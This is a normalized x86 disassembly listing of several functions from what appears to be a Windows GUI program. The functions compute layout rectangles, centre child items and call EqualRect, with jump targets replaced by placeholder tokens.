mov edx [ esi + 0x58 ]
sar eax 0x1
mov [ esi + 0xe0 ] eax
mov [ esi + 0xdc ] eax
mov [ esi + 0xec ] ecx
mov [ esi + 0xf0 ] edx
pop edi
retn
sub_417840
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
mov edx ecx
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x8 ]
sub esi [ ecx + 0x4 ]
push edi
xor edi edi
sar esi 0x2
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] edi
mov [ esp + 0x24 ] esi
cmp esi edi
jne r-xdata
mov eax [ edx + 0x4 ]
mov ebx [ eax + 0xc0 ]
xor eax eax
mov [ esp + 0x40 ] ebx
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] eax
cmp esi edi
jle r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ edx + 0x30 ]
mov [ esp + 0x30 ] eax
mov eax [ edx + 0x34 ]
mov [ esp + 0x34 ] eax
mov eax [ edx + 0x38 ]
mov [ esp + 0x38 ] eax
mov eax [ edx + 0x3c ]
mov [ esp + 0x3c ] eax
cmp ebx edi
jne r-xdata
cmp eax esi
jge r-xdata
cmp ebx 0x2
jne r-xdata
mov eax [ edx + 0x38 ]
sub eax [ edx + 0x30 ]
sub eax [ esp + 0x14 ]
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x30 ] eax
jmp r-xdata
mov ecx [ esp + 0x28 ]
inc eax
mov [ esp + 0x18 ] eax
cmp eax esi
jl r-xdata
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov [ esp + 0x1c ] ecx
cmp ecx edi
je r-xdata
xor ebx ebx
mov [ esp + 0x1c ] ebx
cmp esi edi
jle r-xdata
sub eax [ edx + 0x34 ]
sub eax [ esp + 0x10 ]
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x34 ] eax
mov edx [ ecx + 0xc ]
sub edx [ ecx + 0x8 ]
xor esi esi
sar edx 0x2
cmp edx edi
jle r-xdata
mov ecx [ esp + 0x64 ]
mov eax [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
mov edx [ esp + 0x20 ]
mov esi [ esp + 0x24 ]
cmp esi edx
jge r-xdata
mov edx [ ecx + 0x8 ]
sub edx [ ecx + 0x4 ]
sar edx 0x2
cmp ebx edx
jge r-xdata
inc esi
cmp esi edx
jl r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
cmp eax edi
je r-xdata
inc ebx
mov [ esp + 0x1c ] ebx
cmp ebx esi
jl r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + ebx * 4 ]
mov [ esp + 0x14 ] ecx
cmp ecx edi
je r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
cmp ebx edi
jne r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x8 ]
xor esi esi
sar eax 0x2
mov [ esp + 0x10 ] esi
cmp eax edi
jle r-xdata
cmp ebx 0x2
jne r-xdata
mov ebx [ eax + 0x2c ]
add ebx [ eax + 0x24 ]
add ebx [ eax + 0x1c ]
add [ esp + 0x14 ] ebx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ eax ]
push ecx
mov ecx eax
mov eax [ edx + 0x88 ]
call eax
mov esi [ esp + 0x24 ]
cmp esi eax
jge r-xdata
mov ecx [ eax + 0x28 ]
xor ebx ebx
cmp ecx edi
setle bl
dec ebx
and ecx ebx
mov ebx [ eax + 0x30 ]
add ebx [ eax + 0x20 ]
add ebx ecx
add [ esp + 0x10 ] ebx
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x40 ]
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x8 ]
inc esi
sar eax 0x2
mov [ esp + 0x10 ] esi
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x8 ]
mov edx [ edx + esi * 4 ]
mov [ esp + 0x18 ] edx
cmp edx edi
je r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ edx + 0x4 ]
mov esi [ esp + 0x30 ]
mov eax [ esp + 0x38 ]
mov ebx [ esp + 0x3c ]
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] edi
cmp [ edx + 0x2c ] 0x1
mov edi [ esp + 0x34 ]
jne r-xdata
mov edx [ ecx + 0x58 ]
cmp [ edx - 0xc ] 0x0
jne r-xdata
mov edx [ esp + 0x20 ]
mov esi [ edx + 0x50 ]
mov edi [ edx + 0x54 ]
mov eax [ edx + 0x58 ]
mov ebx [ edx + 0x5c ]
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
xor edi edi
mov edx [ esp + 0x40 ]
test edx edx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov [ esp + 0x4c ] eax
mov eax [ esp + 0x30 ]
mov [ esp + 0x44 ] esi
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] edi
mov [ esp + 0x50 ] ebx
mov edx [ ecx + 0x24 ]
add edx eax
mov [ esp + 0x44 ] edx
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
cmp [ esp + 0x2c ] 0x0
mov esi [ esp + 0x18 ]
jne r-xdata
mov [ esp + 0x48 ] edi
mov edi [ esp + 0x34 ]
mov [ esp + 0x48 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] ebx
mov edx [ ecx + 0x28 ]
add edx edi
mov [ esp + 0x48 ] edx
mov edi [ ecx + 0x20 ]
test edi edi
je r-xdata
add edi [ ecx + 0x28 ]
mov [ esp + 0x48 ] edi
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
add eax edx
mov [ esp + 0x4c ] eax
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x60 ]
lea ecx [ esp + 0x44 ]
push ecx
mov ecx esi
call edx
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x48 ]
mov eax [ esi + 0x40 ]
mov [ esp + 0x58 ] ecx
lea ecx [ esp + 0x54 ]
mov [ esp + 0x5c ] edx
mov [ esp + 0x54 ] eax
mov eax [ esi + 0x4c ]
push ecx
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x68 ] eax
call [ EqualRect@IAT ]
mov [ esp + 0x2c ] eax
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
add edi edx
mov [ esp + 0x50 ] edi
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov ecx [ ecx + 0x2c ]
add ecx [ esp + 0x4c ]
mov [ esp + 0x30 ] ecx
jmp r-xdata
add eax edi
mov [ esp + 0x50 ] eax
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
mov ecx [ ecx + 0x30 ]
add ecx [ esp + 0x50 ]
mov [ esp + 0x34 ] ecx
add eax esi
mov [ esp + 0x4c ] eax
mov edx [ ecx + 0x1c ]
test edx edx
je r-xdata
mov eax ebx
sub eax edx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add edi eax
mov [ esp + 0x48 ] edi
sub eax edx
sub eax esi
cdq
sub eax edx
mov esi eax
sar esi 0x1
mov [ esp + 0x44 ] esi
sub_417bd0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
push ebx
push esi
push edi
xor edi edi
sar eax 0x2
mov esi ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x34 ] edi
mov [ esp + 0x44 ] eax
cmp eax edi
jne r-xdata
mov [ esp + 0x40 ] edi
cmp eax edi
jle r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x8c ]
mov eax [ esp + 0x34 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edx + 0x8 ]
sub ecx [ edx + 0x4 ]
sar ecx 0x2
cmp edi ecx
jge r-xdata
inc edi
mov [ esp + 0x40 ] edi
cmp edi eax
jl r-xdata
mov ecx [ edx + 0x4 ]
mov ecx [ ecx + edi * 4 ]
mov [ esp + 0x3c ] ecx
test ecx ecx
je r-xdata
mov edi [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov ebx [ esi + 0x38 ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x28 ] eax
mov eax [ esi + 0x3c ]
mov [ esp + 0x24 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x8 ]
mov [ esp + 0x18 ] edi
sar eax 0x2
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x2c ] 0x0
test eax eax
jle r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esi + eax * 4 + 0xbc ] ecx
cmp edx 0x3
ja r-xdata
jmp r-xdata
mov edx [ esi ]
mov eax [ esp + 0x3c ]
mov edx [ edx + 0x88 ]
push eax
mov ecx esi
call edx
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
mov edi [ esp + 0x40 ]
jmp [ edx * 4 + jump_table_418460 ]
mov ecx [ esp + 0x2c ]
cmp ecx eax
jge r-xdata
cmp ecx ebx
test ecx ecx
jg r-xdata
cmp ecx [ esp + 0x24 ]
jmp r-xdata
test ecx ecx
jg r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x8 ]
inc [ esp + 0x2c ]
sar eax 0x2
cmp [ esp + 0x2c ] eax
jl r-xdata
mov eax [ esp + 0x3c ]
mov eax [ eax + 0x8 ]
mov eax [ eax + ecx * 4 ]
mov [ esp + 0x38 ] eax
test eax eax
je r-xdata
mov [ esi + eax * 4 + 0xbc ] 0x0
jmp r-xdata
mov [ esi + eax * 4 + 0xbc ] ebx
jmp r-xdata
jl r-xdata
mov ecx [ esp + 0x24 ]
mov [ esi + eax * 4 + 0xbc ] ecx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x78 ] 0x0
mov eax [ eax + 0x2c ]
mov [ esp + 0x30 ] eax
cmp eax 0x1
jne r-xdata
mov eax [ ecx + 0x58 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov edi [ esi + 0x50 ]
mov edx [ esi + 0x54 ]
mov ebx [ esi + 0x58 ]
mov eax [ esi + 0x5c ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] eax
mov eax [ ecx + 0x34 ]
mov [ esp + 0x28 ] eax
mov eax [ ecx + 0x38 ]
test eax eax
je r-xdata
mov edx [ ecx + 0x48 ]
mov eax [ ecx + 0x4c ]
mov [ esp + 0x4c ] edx
mov edx [ ecx + 0x50 ]
mov [ esp + 0x50 ] eax
mov eax [ ecx + 0x54 ]
mov [ esp + 0x54 ] edx
mov [ esp + 0x58 ] eax
lea ecx [ esp + 0x4c ]
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x5c ]
call sub_40e630
mov ecx [ eax ]
mov [ esp + 0x6c ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x70 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x74 ] ecx
mov edx [ eax + 0xc ]
mov ecx [ esp + 0x38 ]
mov [ esp + 0x78 ] edx
mov eax [ ecx ]
mov eax [ eax + 0x60 ]
lea edx [ esp + 0x6c ]
push edx
call eax
jmp r-xdata
cmp [ ecx + 0x3c ] 0x0
mov eax [ esp + 0x28 ]
je r-xdata
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov edx [ esp + 0x1c ]
cmp eax 0x3
ja r-xdata
dec eax
je r-xdata
test eax eax
je r-xdata
cmp [ ecx + 0x1c ] 0x0
je r-xdata
cmp [ esp + 0x34 ] 0x0
mov ebx [ esp + 0x38 ]
jne r-xdata
jmp [ eax * 4 + jump_table_418450 ]
mov eax [ esi + 0xe4 ]
mov [ esp + 0x74 ] ebx
mov ebx [ esp + 0x24 ]
mov [ esp + 0x70 ] edx
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] edi
mov [ esp + 0x78 ] ebx
add eax [ ecx + 0x28 ]
mov [ esp + 0x14 ] 0xa
mov [ esp + 0x70 ] eax
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x28 ]
sub eax 0x0
je r-xdata
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x60 ]
lea ecx [ esp + 0x6c ]
push ecx
mov ecx ebx
call edx
mov ebx [ esp + 0x20 ]
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x48 ]
mov eax [ ebx + 0x40 ]
mov [ esp + 0x80 ] ecx
lea ecx [ esp + 0x7c ]
mov [ esp + 0x84 ] edx
mov [ esp + 0x7c ] eax
mov eax [ ebx + 0x4c ]
push ecx
lea edx [ esp + 0x70 ]
push edx
mov [ esp + 0x90 ] eax
call [ EqualRect@IAT ]
mov [ esp + 0x34 ] eax
cmp [ esp + 0x30 ] 0x1
mov [ esp + 0x14 ] 0x0
jne r-xdata
cmp [ esp + 0x30 ] 0x1
mov [ esp + 0x14 ] 0x1
jne r-xdata
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x78 ] edx
mov edx [ esi + 0xc4 ]
mov eax edi
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] edx
mov [ esp + 0x74 ] ebx
add edx [ ecx + 0x28 ]
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x70 ] edx
add eax [ ecx + 0x24 ]
mov [ esp + 0x6c ] eax
mov ebx [ ecx + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc8 ]
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x78 ] edx
mov [ esp + 0x78 ] eax
mov [ esp + 0x6c ] edi
mov [ esp + 0x74 ] ebx
sub eax [ ecx + 0x30 ]
mov [ esp + 0x14 ] 0x3
mov [ esp + 0x78 ] eax
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
mov eax [ ecx + 0x30 ]
add eax ebx
cmp eax [ esp + 0x10 ]
jle r-xdata
lea ebx [ edx + eax ]
mov [ esp + 0x78 ] ebx
mov eax [ esi + 0xdc ]
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] edi
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] edx
add eax [ ecx + 0x28 ]
mov [ esp + 0x14 ] 0x8
mov [ esp + 0x70 ] eax
mov edx [ ecx + 0x1c ]
test edx edx
je r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
mov eax [ esi + 0xcc ]
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edx
mov [ esp + 0x6c ] eax
mov [ esp + 0x74 ] ebx
add eax [ ecx + 0x24 ]
mov [ esp + 0x14 ] 0x4
mov [ esp + 0x6c ] eax
add edx [ ecx + 0x28 ]
mov [ esp + 0x70 ] edx
mov ebx [ ecx + 0x1c ]
test ebx ebx
je r-xdata
dec eax
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x74 ] eax
sub eax edi
mov [ esp + 0x6c ] edi
mov [ esp + 0x78 ] edx
sub eax [ ecx + 0x1c ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
add ebx edi
mov [ esp + 0x6c ] ebx
cmp ebx edi
jge r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x14 ]
mov eax [ esi + eax * 4 + 0xbc ]
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edx
mov [ esp + 0x6c ] eax
mov [ esp + 0x74 ] ebx
add eax [ ecx + 0x24 ]
mov [ esp + 0x6c ] eax
add edx [ ecx + 0x28 ]
mov [ esp + 0x70 ] edx
mov edx [ ecx + 0x1c ]
test edx edx
je r-xdata
mov [ esp + 0x14 ] 0xc
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x14 ]
mov eax [ esi + eax * 4 + 0xbc ]
mov [ esp + 0x74 ] ebx
mov [ esp + 0x70 ] edx
mov [ esp + 0x74 ] eax
mov [ esp + 0x6c ] edi
sub eax [ ecx + 0x2c ]
mov [ esp + 0x74 ] eax
add edx [ ecx + 0x28 ]
mov [ esp + 0x70 ] edx
mov ebx [ ecx + 0x1c ]
test ebx ebx
je r-xdata
mov [ esp + 0x14 ] 0xd
mov eax [ ecx + 0x2c ]
sub [ esp + 0x74 ] eax
add ebx eax
mov [ esp + 0x74 ] ebx
jmp r-xdata
mov eax [ esi + 0xc4 ]
mov edx eax
mov [ esp + 0x70 ] edx
add edx [ ecx + 0x28 ]
mov [ esp + 0x70 ] edx
sub eax edx
mov [ esp + 0x70 ] eax
sub eax [ ecx + 0x28 ]
jmp r-xdata
mov eax [ esi + 0xf0 ]
mov [ esp + 0x74 ] eax
sub eax [ ecx + 0x2c ]
mov [ esp + 0x74 ] eax
mov ecx [ ecx + 0x1c ]
test ecx ecx
je r-xdata
mov [ esp + 0x10 ] eax
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
add edx edi
mov [ esp + 0x74 ] edx
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
mov eax [ esi + 0xe0 ]
mov [ esp + 0x78 ] eax
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edx
mov [ esp + 0x74 ] ebx
sub eax [ ecx + 0x30 ]
mov [ esp + 0x14 ] 0x9
mov [ esp + 0x78 ] eax
mov ebx [ ecx + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
add ebx eax
mov [ esp + 0x74 ] ebx
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
mov eax [ esi + 0xd0 ]
mov [ esp + 0x74 ] ebx
mov [ esp + 0x70 ] edx
mov [ esp + 0x74 ] eax
mov [ esp + 0x6c ] edi
sub eax [ ecx + 0x2c ]
mov [ esp + 0x14 ] 0x5
mov [ esp + 0x74 ] eax
add edx [ ecx + 0x28 ]
mov [ esp + 0x70 ] edx
mov ebx [ ecx + 0x1c ]
test ebx ebx
je r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x24 ]
sub eax [ ecx + 0x20 ]
sub eax [ esp + 0x1c ]
cdq
sub eax edx
mov edx [ esp + 0x1c ]
sar eax 0x1
add eax edx
mov [ esp + 0x70 ] eax
cmp eax edx
jge r-xdata
mov ebx edi
mov [ esp + 0x6c ] ebx
cmp [ esp + 0x30 ] 0x1
jne r-xdata
add eax edx
mov [ esp + 0x74 ] eax
cmp eax ebx
jle r-xdata
cmp [ esp + 0x30 ] 0x1
jne r-xdata
sub eax ebx
mov [ esp + 0x6c ] eax
cmp eax edi
jge r-xdata
mov eax [ esi + 0xc8 ]
mov edx eax
mov [ esp + 0x78 ] edx
sub edx [ ecx + 0x30 ]
mov ecx eax
mov [ esp + 0x78 ] edx
add eax edx
mov [ esp + 0x78 ] eax
mov ecx [ ecx + 0x30 ]
add ecx eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
cmp eax [ esp + 0x10 ]
jle r-xdata
add ecx edx
mov [ esp + 0x74 ] ecx
mov edx [ esp + 0x6c ]
add edx [ ecx + 0x24 ]
mov [ esp + 0x6c ] edx
mov ecx [ ecx + 0x1c ]
test ecx ecx
je r-xdata
sub eax ecx
mov [ esp + 0x6c ] eax
jmp r-xdata
mov ecx [ ecx + 0x30 ]
add ecx [ esp + 0x78 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
add edx eax
mov [ esp + 0x78 ] edx
jmp r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
sub eax ebx
mov edx eax
mov [ esp + 0x70 ] edx
mov ecx [ ecx + 0x2c ]
add ecx [ esp + 0x74 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
add eax edx
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x6c ]
sub eax ebx
mov [ esp + 0x6c ] eax
jmp r-xdata
mov eax [ esi + 0xd4 ]
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] edi
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] edx
add eax [ ecx + 0x28 ]
mov [ esp + 0x14 ] 0x6
mov [ esp + 0x70 ] eax
mov edx [ ecx + 0x20 ]
test edx edx
je r-xdata
add ebx [ ecx + 0x24 ]
mov [ esp + 0x6c ] ebx
mov edx [ ecx + 0x1c ]
add edx ebx
mov ebx [ esp + 0x20 ]
mov [ esp + 0x74 ] edx
cmp edx ebx
jle r-xdata
mov eax edx
mov [ esp + 0x70 ] eax
mov eax [ esi + 0xc0 ]
mov eax [ esi + 0xf0 ]
jmp r-xdata
mov edx [ ecx + 0x2c ]
add edx eax
jmp r-xdata
mov eax ebx
mov [ esp + 0x74 ] eax
mov eax [ esi + 0xbc ]
mov eax [ esi + 0xec ]
jmp r-xdata
sub eax [ ecx + 0x24 ]
jmp r-xdata
mov eax edi
mov [ esp + 0x6c ] eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
cmp ecx [ esp + 0x10 ]
jle r-xdata
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
sub edx [ ecx + 0x30 ]
cmp edx [ esp + 0x10 ]
jle r-xdata
add eax [ esp + 0x6c ]
mov [ esp + 0x74 ] eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
sub eax [ ecx + 0x24 ]
jmp r-xdata
add ebx edx
mov [ esp + 0x78 ] ebx
mov ebx [ ecx + 0x20 ]
test ebx ebx
je r-xdata
mov edx [ ecx + 0x1c ]
test edx edx
je r-xdata
add edx eax
mov [ esp + 0x78 ] edx
add eax [ ecx + 0x28 ]
mov [ esp + 0x70 ] eax
mov ecx [ ecx + 0x20 ]
add ecx eax
mov [ esp + 0x78 ] ecx
cmp ecx [ esp + 0x24 ]
jle r-xdata
mov [ esp + 0x74 ] ebx
mov eax [ ecx + 0x30 ]
add [ esp + 0x78 ] eax
add eax [ esp + 0x70 ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
cmp eax ecx
jle r-xdata
mov [ esp + 0x74 ] eax
mov edx eax
sub eax [ ecx + 0x2c ]
mov [ esp + 0x74 ] eax
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x30 ]
add [ esp + 0x78 ] ecx
add ebx edx
mov [ esp + 0x78 ] ebx
jmp r-xdata
mov [ esp + 0x6c ] eax
mov ebx [ ecx + 0x20 ]
test ebx ebx
je r-xdata
mov [ esp + 0x10 ] edx
jmp r-xdata
mov eax ebx
sub eax edx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax edi
mov [ esp + 0x6c ] eax
mov edx [ ecx + 0x1c ]
add edx eax
mov [ esp + 0x74 ] edx
mov eax [ esp + 0x24 ]
mov [ esp + 0x78 ] eax
jmp r-xdata
mov [ esp + 0x10 ] edx
jmp r-xdata
cmp edx [ esp + 0x10 ]
jle r-xdata
mov [ esp + 0x78 ] ecx
jmp r-xdata
mov eax edi
jmp r-xdata
cmp eax edi
jge r-xdata
sub_418480
mov eax [ ecx - 0x70 ]
mov edx [ eax + 0x64 ]
push ebx
push esi
push edi
lea edi [ ecx - 0x70 ]
xor ebx ebx
mov [ ecx + 0xcc ] ebx
mov ecx edi
call edx
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
sar esi 0x2
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
sub_4184d0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x4c ]
push ecx
mov ecx edi
call edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x70 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ecx esi
call edx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x64 ]
lea ecx [ edi - 0x70 ]
call edx
mov eax [ esi ]
mov edx [ eax + 0x24 ]
push ebx
mov ecx esi
call edx
pop ebx
sub_418520
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0xd8 ]
sub eax [ ecx + 0xd4 ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ecx
test eax 0xfffffffc
jle r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx + 0xd8 ]
sub eax [ ecx + 0xd4 ]
push edi
mov edi [ ecx + 0xd8 ]
sub edi [ ecx + 0xd4 ]
push esi
sar edi 0x2
sar eax 0x2
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] eax
lea esp [ esp ]
xor esi esi
mov edx [ ecx + 0xd4 ]
mov esi [ edx + ebx * 4 ]
jmp r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
cmp edx eax
jge r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
xor edx edx
sar eax 0x2
test eax eax
jle r-xdata
cmp ebx edi
jge r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor edi edi
mov ecx [ esi + 0x8 ]
mov edi [ ecx + edx * 4 ]
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x74 ]
mov ecx edi
call eax
test al al
jne r-xdata
inc edx
cmp edx eax
jl r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ edi + 0x8 ] ecx
je r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
xor ebx ebx
sar eax 0x2
test eax eax
jle r-xdata
mov edx [ edi ]
mov eax [ edx + 0x24 ]
push 0x1
mov ecx edi
call eax
mov ecx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
pop esi
pop edi
cmp ebx eax
jge r-xdata
xor edi edi
mov ecx [ esi + 0x8 ]
mov edi [ ecx + ebx * 4 ]
jmp r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
inc ebx
sar eax 0x2
cmp ebx eax
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x74 ]
mov ecx edi
call edx
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edi + 0x8 ] edx
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x24 ]
push 0x0
mov ecx edi
call edx
sub_418630
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push edi
mov edi ecx
mov edx [ edi ]
push eax
mov eax [ edx + 0x4c ]
call eax
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx + 0x8 ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x4c ]
mov ecx edi
mov [ ebp + 0x8 ] ebx
call eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + 0x44 ]
cmp [ edx - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x10
mov al 0x1
jne r-xdata
push ebx
add edi 0xd0
push edi
call sub_427ec0
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov [ edi + 0x24 ] al
push esi
lea esi [ edi + 0x4 ]
lea ecx [ ebp + 0x8 ]
call sub_428170
pop esi
mov [ edi + 0x25 ] al
sub_4186b0
push ebp
mov ebp esp
push 0xffffffff
push sub_448934
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x70 ]
push edi
call sub_412a20
mov ecx 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x140 ]
mov [ esi ] r--data
mov [ edi ] r--data
mov [ eax ] r--data
mov [ ebp - 0x10 ] eax
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x13c ] ebx
mov [ ebp - 0x4 ] 0x4
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x64 ] ecx
mov [ esi + 0x68 ] bl
